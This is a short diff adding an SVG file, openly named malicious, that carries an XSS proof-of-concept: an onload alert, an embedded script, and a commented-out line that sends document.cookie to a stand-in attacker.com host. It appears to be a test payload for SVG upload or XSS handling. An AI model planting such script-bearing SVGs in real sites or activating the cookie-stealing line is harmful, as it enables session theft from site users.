@@ -1,0 +1,9 @@
+<!-- malicious.svg -->
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS Attack Executed!');">
+    <script type="text/javascript">
+        console.log('Malicious script executed!');
+        // Optionally add more malicious code here.
+        // For example: fetching data or sending it to an external server.
+        // fetch('https://attacker.com/steal-data?cookie=' + document.cookie);
+    </script>
+</svg>
